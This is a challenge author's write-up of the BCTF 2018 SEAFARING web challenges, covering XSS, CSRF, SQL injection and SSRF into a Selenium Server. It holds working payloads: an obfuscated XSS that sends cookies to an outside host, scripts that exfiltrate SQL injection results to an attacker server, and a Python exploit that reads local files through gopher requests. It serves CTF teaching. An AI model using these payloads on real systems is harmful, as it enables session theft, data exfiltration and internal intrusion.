---
layout: post
category: CTF
title: SEAFARING 出题笔记
subtitle: BCTF 2018 Web SEAFARING 
catalog: true
excerpt:  BCTF2018，参与命题了两道Web，记录一下出题笔记。
time: 2018.12.01 22:35:00
tags:
- CTF
- Web

---




# SEAFARING 

> Life at least two impulses, a time for a love regardless of personal danger, go to travel.

知识点：

- XSS
- CSRF
- SQLi
- Selenium Server



## 0x00 杂谈

> 在线环境：http://ctf.momomoxiaoxi.com:9999
>
> docker 源码：https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/BCTF2018

去年为整个清华校园网做了一下安全测试，发现校园环境中存在大量的反射型XSS，部分站点甚至会将用户名与密码明文存储在cookie中。

而在普通人眼里看来，反射型xss一般属于鸡肋型漏洞，常常会被忽略。

因此，便想设计一个CTF题目来探究下反射型xss到底能做到哪些攻击。

在校园网站点中，大量存在json型反射XSS，即将json错误数据以`tets/html`格式返回了。（错误数据中存在可控参数）。

结合校园网情况，题目存在一个内网验证，有些高级功能仅能从内网访问。

第二个主要考察点为内网攻击Selenium Server。 现在公网上存在着大量的Selenium Server，一些用于自动化测试、一些用于爬虫处理。而该软件往往以docker部署，会存在未授权访问安全问题。一旦攻击者可以未授权访问该Server，便意味着攻击者拥有了一个完全可控的浏览器，可以进行`file:///`协议任意遍历本地路径，也可以直接远程js挖矿等等。

这里主要结合XSS机器人。后台XSS机器人基于Selenium Server实现，持续浏览攻击者留言的url地址。

>关于前端
>
>因为比赛是在迪拜，就想着结合海湾旅行找了一个，和cms无关。
>
>Life at least two impulses, a time for a love regardless of personal danger, go to travel.
>
>去迪拜浪了一圈，玩的还是很high。: ) 

##0x01 SEAFARING1

> 因为题目释放时间较晚，所以在释放前主动加了一个hint ,robots.txt防止选手走歪。robots.txt提示了漏洞存在的php点。

第一个漏洞点是程序员die()函数不当，导致信息泄漏。

```bash
curl http://ctf.momomoxiaoxi.com:9999/admin/index.php
```

```js
<script>
    function view_uid(uid) {
        $.ajax({
            type: "POST",
            url: "/admin/handle_message.php",
            data: {"token": csrf_token, "action": "view_uid", "uid": uid},
            dataType: "json",
            success: function (data) {
                if (!data["error"]) {
                    data = data['result'];
                    var Status = '';
                    $('#timestamp').text(data['timestamp']);
                    $('#username').text(data['user_name']);
                    $('#message').text(data['message']);
                    document.getElementById("replyuid").value=data['uid'];
                    if (parseInt(data['is_checked']) == 1) {
                        Status = '<div style="color:#04FF00">Checked</div>';
                    } else {
                        Status = '<div style="color:#FFA500">Not Checked</div>';
                    }
                    document.getElementById("status").innerHTML = Status;
                }
                else
                    alert('Error: ' + data["error"]);
            }
        });
    }

    function view_unreads() {
        $.ajax({
            type: "POST",
            url: "/admin/handle_message.php",
            data: {"token": csrf_token, "action": "view_unreads", "status": 0},
            dataType: "json",
            success: function (data) {
                if (!data["error"]) {
                    data = data['result'];
                    var html = '';
                    var tbody = document.getElementById("comments");
                    for (var i = 0; i < data.length; i++) {
                        var Time = data[i][0];
                        var Username = data[i][1];
                        var Uid = data[i][2];
                        var Status = '';
                        if (parseInt(data[i][3]) == 1) {
                            Status = '<div style="color:#04FF00">Checked</div>';
                        } else {
                            Status = '<div style="color:#FFA500">Not Checked</div>';
                        }
                        html += "<tr> <td > <center> " + Time + " </center></td> <td> <center> " + Username + " </center></td> <td> <center> <a onclick = view_uid('" + Uid + "') > " + Uid + " </a></center> </td> <td> <center> " + Status + " </center></td> </tr>"
                    }
                    tbody.innerHTML = html;
                }
                else
                    alert('Error: ' + data["error"]);
            }
        });
    }

    function set_reply() {
        var uid = document.getElementById("replyuid").value;
        var  reply =  document.getElementById("replymessage").value;
        $.ajax({
            type: "POST",
            url: "/admin/handle_message.php",
            data: {"token": csrf_token, "action": "set_reply", "uid": uid, "reply": reply},
            dataType: "json",
            success: function (data) {
                if (!data["error"]) {
                    data = data['result'];
                    alert('Succ: ' + data);
                }
                else
                    alert('Error: ' + data["error"]);
            }
        });
    }

    function load_all() {
        $.ajax({
            type: "POST",
            url: "/admin/handle_message.php",
            data: {"token": csrf_token, "action": "load_all"},
            dataType: "json",
            success: function (data) {
                if (!data["error"]) {
                    data = data['result'];
                    var html = '';
                    var tbody = document.getElementById("comments");
                    for (var i = 0; i < data.length; i++) {
                        var Time = data[i][0];
                        var Username = data[i][1];
                        var Uid = data[i][2];
                        var Status = '';
                        if (parseInt(data[i][3]) == 1) {
                            Status = '<div style="color:#04FF00">Checked</div>';
                        } else {
                            Status = '<div style="color:#FFA500">Not Checked</div>';
                        }
                        html += "<tr> <td > <center> " + Time + " </center></td> <td> <center> " + Username + " </center></td> <td> <center> <a onclick = view_uid('" + Uid + "') > " + Uid + " </a></center> </td> <td> <center> " + Status + " </center></td> </tr>"
                    }
                    tbody.innerHTML = html;
                }
                else
                    alert('Error: ' + data["error"]);
            }
        });
    }
    setTimeout(load_all, 1000);
</script>
```

会泄漏一段异步加载的js，从而泄漏后台的一些api和参数。



在handle_message.php存在反射型XSS。

漏洞php：

```php
else
{
    $result['error'] = "CSRFToken  '".$_POST['token']."'is not correct";
    echo json_encode($result);
}
?>

```

测试exp：

```bash
POST /admin/handle_message.php HTTP/1.1
Host: ctf.momomoxiaoxi.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 269
Cookie: PHPSESSID=kbg91rh9u9gvpkcjt9im1tgse4
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

action=view_unreads&status=1&token=d096148ee0d3cf1'<svg onload='img = new Image(); img.src=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 50, 48, 50, 46, 49, 49, 50, 46, 53, 49, 46, 49, 51, 48, 58, 57, 48, 57, 48, 47, 63, 122, 61).concat(btoa(document.cookie));'>'
```

可以用来打cookie。

整个站点存在一个留言功能，admin会依次check用户的留言，并点击里面的http地址。

检查逻辑如下：

```bash
while (True):
    cursor = db.cursor()
    try:
        cursor.execute(query_select)
        results = cursor.fetchall()
        if len(results):
            print("[+] New message: {}".format(results))
            for row in results:
                print("[+] row: {}".format(row))
                try:
                    message = row[1]
                    print("[+] message {}".format(message))
                    found = re.search('(?i)(http|https):\/\/([^ ]+)', message)
                    if found:
                        url = found.group(0)
                        print("[+] found url: {}".format(url))
                        check(url)
                except Exception as e2:
                    print('[-] except: %s' % e2)
                query = query_update.replace('$id$', str(row[0]))
                cursor.execute(query)
                db.commit()
        else:
            print("[+] waiting...")
    except Exception as e:
        print('[-] exception: %s' % e)
    time.sleep(1)
```

因此，可以通过CSRF+XSS组合拳获得admin的cookie，利用burpsuite 生成的CSRF payload 如下：

```bash
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body onload="document.forms[0].submit()">
  <script>history.pushState('', '', '/')</script>
    <form action="http://ctf.momomoxiaoxi.com/admin/handle_message.php" method="POST">
      <input type="hidden" name="action" value="view&#95;unreads" />
      <input type="hidden" name="status" value="1" />
      <input type="hidden" name="token" value="d096148ee0d3cf1&apos;&lt;svg&#32;onload&#61;&apos;img&#32;&#61;&#32;new&#32;Image&#40;&#41;&#59;&#32;img&#46;src&#61;String&#46;fromCharCode&#40;104&#44;&#32;116&#44;&#32;116&#44;&#32;112&#44;&#32;58&#44;&#32;47&#44;&#32;47&#44;&#32;50&#44;&#32;48&#44;&#32;50&#44;&#32;46&#44;&#32;49&#44;&#32;49&#44;&#32;50&#44;&#32;46&#44;&#32;53&#44;&#32;49&#44;&#32;46&#44;&#32;49&#44;&#32;51&#44;&#32;48&#44;&#32;58&#44;&#32;57&#44;&#32;48&#44;&#32;57&#44;&#32;48&#44;&#32;47&#44;&#32;63&#44;&#32;122&#44;&#32;61&#41;&#46;concat&#40;btoa&#40;document&#46;cookie&#41;&#41;&#59;&apos;&gt;&apos;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


```

而这里，限制了handle_message.php只能通过内网访问，因此只能通过CSRF+XSS去测试接口。

为了降低测试的难度，这里我将所有的sql错误信息返回，用于方便选手测试。

```php
case 'view_unreads':
                    $status = $dbc->real_escape_string($_POST['status']);
                    $query = "SELECT timestamp,user_name,uid,is_checked FROM feedbacks  where is_checked={$status} ORDER BY id DESC limit 0,50";
                    $sql_result = $dbc->query($query);
                    if($sql_result->num_rows > 0){
                        $row = $sql_result->fetch_all();
                        $result['result'] = $row;
                    }else{
                        $result['error'] = "sql query error! debug info:".$query;
                    }
                    echo json_encode($result);
                    break ;
```

虽然程序员将所有的参数都进行了real_escape_string，但数字型注入可以直接进行注入。

这里有一个另外的难点在于所有与handle_message的交互，存在csrftoken。因此，我们需要先通过某种方式窃取到csrftoken，才能进行注入。

此外，为了保证不违反同源策略，我们并不能在自己的第三方页面，直接iframe窃取token数据。（除非受害者服务器错误配置了CORS策略）

```html
POST /admin/handle_message.php HTTP/1.1
Host: dbseafaring.xctf.org.cn:9999
User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 450
Cookie: PHPSESSID=as10gmvdfn6k2fu7i40e76qeq2
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

token=111'<svg onload='var myScript= document.createElement(String.fromCharCode(115, 99, 114, 105, 112, 116));myScript.type=String.fromCharCode(32, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116);myScript.src=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 111, 106, 46, 109, 111, 109, 111, 109, 111, 120, 105, 97, 111, 120, 105, 46, 99, 111, 109, 47, 101, 120, 112, 49, 46, 106, 115);document.body.appendChild(myScript);'>

```

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body onload="document.forms[0].submit()">
  <script>history.pushState('', '', '/')</script>
    <form action="http://seafaring.xctf.org.cn:9999/admin/handle_message.php" method="POST">
      <input type="hidden" name="token" value="111&apos;&lt;svg&#32;onload&#61;&apos;var&#32;myScript&#61;&#32;document&#46;createElement&#40;String&#46;fromCharCode&#40;115&#44;&#32;99&#44;&#32;114&#44;&#32;105&#44;&#32;112&#44;&#32;116&#41;&#41;&#59;myScript&#46;type&#61;String&#46;fromCharCode&#40;32&#44;&#32;116&#44;&#32;101&#44;&#32;120&#44;&#32;116&#44;&#32;47&#44;&#32;106&#44;&#32;97&#44;&#32;118&#44;&#32;97&#44;&#32;115&#44;&#32;99&#44;&#32;114&#44;&#32;105&#44;&#32;112&#44;&#32;116&#41;&#59;myScript&#46;src&#61;String&#46;fromCharCode&#40;104&#44;&#32;116&#44;&#32;116&#44;&#32;112&#44;&#32;58&#44;&#32;47&#44;&#32;47&#44;&#32;111&#44;&#32;106&#44;&#32;46&#44;&#32;109&#44;&#32;111&#44;&#32;109&#44;&#32;111&#44;&#32;109&#44;&#32;111&#44;&#32;120&#44;&#32;105&#44;&#32;97&#44;&#32;111&#44;&#32;120&#44;&#32;105&#44;&#32;46&#44;&#32;99&#44;&#32;111&#44;&#32;109&#44;&#32;47&#44;&#32;101&#44;&#32;120&#44;&#32;112&#44;&#32;49&#44;&#32;46&#44;&#32;106&#44;&#32;115&#41;&#59;document&#46;body&#46;appendChild&#40;myScript&#41;&#59;&apos;&gt;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```



```bash
#前面加jquery源码
frameOnload = function () {
    var token = window.frames[0].window.csrf_token;
    var status = '-1 union select flllllag,2,3,4 from f111111ag  -- ';
    view_unreads(token, status)
};
function view_unreads(csrf_token, status) {
    $.ajax({
        type: "POST",
        url: "/admin/handle_message.php",
        data: {"token": csrf_token, "action": "view_unreads", "status": status},
        dataType: "json",
        success: function (data) {
            if (!data["error"]) {
                data = data['result'];
                alert(data);
                send_secret(data);
            }
            else
                alert('Error: ' + data["error"]);
        }
    });
}

function send_secret(data){
    var url = 'http://oj.momomoxiaoxi.com:9090'
    $.get(url, {'key1':data});
}
document.write("<script type='text/javascript' src='https://code.jquery.com/jquery-3.3.1.min.js'></script>");
var iframe = document.createElement('iframe');
iframe.src = "http://ctf.momomoxiaoxi.com/admin/index.php";
iframe.onload = frameOnload;
document.body.appendChild(iframe);
```



## 0x02 SEAFARING2

在1中，我们登陆上admin后会有一个提示信息。

```
I will tell you a secret path for web2:/admin/m0st_Secret.php! :)
```

此时，我们还有一个sql注入可以用。因此，直接使用load_file读取源码即可，读取的时候注意无法使用单引号，因此需要16进制编码。（因为无引号，所以也没办法dumpfile）

对应exp如下：

```js
frameOnload = function () {
    var token = window.frames[0].window.csrf_token;
//    var status ='-1 union select 1,2,3,4 -- ';
    var status = '-1 union select load_file(0x2f7661722f7777772f68746d6c2f61646d696e2f6d3073745f5365637265742e706870),2,3,4 -- ';
    view_unreads(token, status);

};


function view_unreads(csrf_token, status) {
    $.ajax({
        type: "POST",
        url: "/admin/handle_message.php",
        data: {"token": csrf_token, "action": "view_unreads", "status": status},
        dataType: "json",
        success: function (data) {
            send_secret(data["result"],data["error"]);

        }
    });
}

function send_secret(data,error){
    var url = 'http://oj.momomoxiaoxi.com:9090'
    $.get(url, {'result':data,'error':error});
}

var iframe = document.createElement('iframe');
iframe.src = "http://seafaring.xctf.org.cn:9999/admin/index.php";
iframe.onload = frameOnload;
document.body.appendChild(iframe);
```

源码：

```php
<?php 
function curl($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $re = curl_exec($ch);
    curl_close($ch);
    return $re;
}
if(!empty($_POST['You_cann0t_guu3s_1t_1s2xs'])){
    $url = $_POST['You_cann0t_guu3s_1t_1s2xs'];
    curl($url);
}else{
    die("Hint: Just for web2! :)");
}
?>
```

显然，SSRF点，结合docker地址机制，很容易发现在前面还存在一台机器，直接扫描下端口，可以看到在4444端口存在以一个selenium Server.

接下来就是通过gopher协议进行`file:///`协议读取即可。

> 这里存在一个很坑的点，selenium Server的实现与其官网文档并不一致。如果你直接抓包，得到的file:///协议控制包，直接重放会无限卡死。这里，采用@zzm的方式，是在gopher后面多加几个0，就可以了，很迷。
>
> 不过，也可以完全按照协议文档说的，直接提交file包，就不会卡死。
>
> 深刻怀疑这种官方文档与实际实现差异这么大的软件，里面肯定存在一些问题。

创建新的session:

```http
POST /wd/hub/session HTTP/1.1
Host: 172.18.0.2:4444
Connection: close
Accept: application/json; charset=utf-8
User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
DNT: 1
Referer: http://172.18.0.2:4444/wd/hub/static/resource/hub.html
Content-Type: text/plain;charset=UTF-8
Content-Length: 49

{"desiredCapabilities":{"browserName":"firefox"}}
```

file协议跳转

```http
POST /wd/hub/session/{session_id}/url HTTP/1.1
Host: 172.18.0.2:4444
Connection: close
Accept: application/json; charset=utf-8
User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
DNT: 1
Referer: http://172.18.0.2:4444/wd/hub/static/resource/hub.html
Content-Type: text/plain;charset=UTF-8
Content-Length: 142

{"url":"file:///etc/passwd?wdsid={session_id}&wdurl=http%3A%2F%2F172.18.0.2%3A4444%2Fwd%2Fhub"}
```

直接file协议不会卡（依据官方文档）

```http
POST /wd/hub/session/{session_id}/url HTTP/1.1
Host: 172.18.0.2:4444
Connection: close
Accept: application/json; charset=utf-8
User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
DNT: 1
Referer: http://172.18.0.2:4444/wd/hub/static/resource/hub.html
Content-Type: text/plain;charset=UTF-8
Content-Length: 142

{"url":"file:///"}
```



截屏

```http
GET /wd/hub/session/{session_id}/screenshot HTTP/1.1
Host: 172.18.0.2:4444
Connection: close
Accept: application/json; charset=utf-8
User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
DNT: 1
Referer: http://172.18.0.2:4444/wd/hub/static/resource/hub.html

```



EXP如下：

 ```python
# coding:utf-8
import requests
import json
import os
import urllib
import base64

BASE_DIR = (os.path.dirname(os.path.realpath(__file__)))
base_url = "http://seafaring.xctf.org.cn:9999"
session = requests.Session()
proxies = {"http": "http://127.0.0.1:8080"}


def encode(origin):
    """
    SSRF HTTP 编码
    :param origin:
    :return:
    """
    tmp = urllib.quote(origin)
    # print tmp
    new = tmp.replace('%0A', '%0D%0A')
    # print new
    result = '_' + urllib.quote(new)
    result = "gopher://172.20.0.2:4444/" + result
    # print result
    return result


def read_file(filename):
    filename = BASE_DIR + '/exp2/' + filename
    with open(filename, 'r') as f:
        data = f.read()
    return data


def get_session():
    payload = read_file('1')
    # print(payload)
    payload = encode(payload)
    print('Payload1 start...\n\n')
    print(payload)
    print('Payload1 end...\n\n')
    session = requests.Session()
    paramsPost = {
        "You_cann0t_guu3s_1t_1s2xs": "gopher://172.20.0.2:4444/_POST%20/wd/hub/session%20HTTP/1.1%0D%0AHost%3A%20172.20.0.2%3A4444%0D%0AConnection%3A%20close%0D%0AAccept%3A%20application/json%3B%20charset%3Dutf-8%0D%0AUser-Agent%3A%20Mozilla/5.0%20%28Android%209.0%3B%20Mobile%3B%20rv%3A61.0%29%20Gecko/61.0%20Firefox/61.0%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Cen-US%3Bq%3D0.5%2Cen%3Bq%3D0.3%0D%0ADNT%3A%201%0D%0AReferer%3A%20http%3A//172.20.0.2%3A4444/wd/hub/static/resource/hub.html%0D%0AContent-Type%3A%20text/plain%3Bcharset%3DUTF-8%0D%0AContent-Length%3A%2049%0D%0A%0D%0A%7B%22desiredCapabilities%22%3A%7B%22browserName%22%3A%22firefox%22%7D%7D"}
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0",
               "Connection": "close", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "DNT": "1",
               "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post(base_url + "/admin/m0st_Secret.php", data=paramsPost,
                            headers=headers, proxies=proxies)
    print("Status code:   %i" % response.status_code)
    print("Response body: %s" % response.content)
    data = response.content.split('"sessionId": "')[1].split('",')[0]
    return data


def load_scripts(id):
    payload = read_file('2')
    payload = payload.replace('{session_id}', id)
    payload = encode(payload)
    print('Payload2 start...\n\n')
    print(payload)
    print('Payload2 end...\n\n')
    session = requests.Session()
    paramsPost = {
        "You_cann0t_guu3s_1t_1s2xs": "gopher://172.20.0.2:4444/_POST%20/wd/hub/session/{session_id}/url%20HTTP/1.1%0D%0AHost%3A%20172.20.0.2%3A4444%0D%0AConnection%3A%20close%0D%0AAccept%3A%20application/json%3B%20charset%3Dutf-8%0D%0AUser-Agent%3A%20Mozilla/5.0%20%28Android%209.0%3B%20Mobile%3B%20rv%3A61.0%29%20Gecko/61.0%20Firefox/61.0%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Cen-US%3Bq%3D0.5%2Cen%3Bq%3D0.3%0D%0ADNT%3A%201%0D%0AReferer%3A%20http%3A//172.20.0.2%3A4444/wd/hub/static/resource/hub.html%0D%0AContent-Type%3A%20text/plain%3Bcharset%3DUTF-8%0D%0AContent-Length%3A%20142%0D%0A%0D%0A%7B%22url%22%3A%22file%3A///Th3_MosT_S3cR3T_fLag%3Fwdsid%3D{session_id}%26wdurl%3Dhttp%253A%252F%252F172.20.0.2%253A4444%252Fwd%252Fhub%22%7D000000000000000000000".format(session_id=id)}
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0",
               "Connection": "close", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "DNT": "1",
               "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post(base_url+"/admin/m0st_Secret.php", data=paramsPost,
                            headers=headers)
    assert response.status_code==200
    print("Status code:   %i" % response.status_code)
    print("Response body: %s" % response.content)


def get_screenshot(id):
    payload = read_file('3')
    payload = payload.replace('{session_id}', id)
    payload = encode(payload)
    print('Payload3 start...\n\n')
    print(payload)
    print('Payload3 end...\n\n')
    session = requests.Session()
    paramsPost = {
        "You_cann0t_guu3s_1t_1s2xs": "gopher://172.20.0.2:4444/_GET%20/wd/hub/session/{}/screenshot%20HTTP/1.1%0D%0AHost%3A%20172.20.0.2%3A4444%0D%0AConnection%3A%20close%0D%0AAccept%3A%20application/json%3B%20charset%3Dutf-8%0D%0AUser-Agent%3A%20Mozilla/5.0%20%28Android%209.0%3B%20Mobile%3B%20rv%3A61.0%29%20Gecko/61.0%20Firefox/61.0%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Cen-US%3Bq%3D0.5%2Cen%3Bq%3D0.3%0D%0ADNT%3A%201%0D%0AReferer%3A%20http%3A//172.20.0.2%3A4444/wd/hub/static/resource/hub.html%0D%0A%0D%0A".format(id)}
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0",
               "Connection": "close", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "DNT": "1",
               "Content-Type": "application/x-www-form-urlencoded"}
    cookies = {"PHPSESSID": "as10gmvdfn6k2fu7i40e76qeq2"}
    response = session.post(base_url+"/admin/m0st_Secret.php", data=paramsPost,
                            headers=headers, cookies=cookies)
    assert response.status_code == 200
    print(response.content)
    results = response.content.split('Server: Jetty(9.4.z-SNAPSHOT)')[1].strip()
    data = json.loads(results)
    png_data = base64.b64decode(data['value'])
    with open(BASE_DIR + '/results.png', 'w') as f:
        f.write(png_data)
    return data


if __name__ == '__main__':
    session_id = get_session()
    load_scripts(session_id)
    get_screenshot(session_id)

 ```





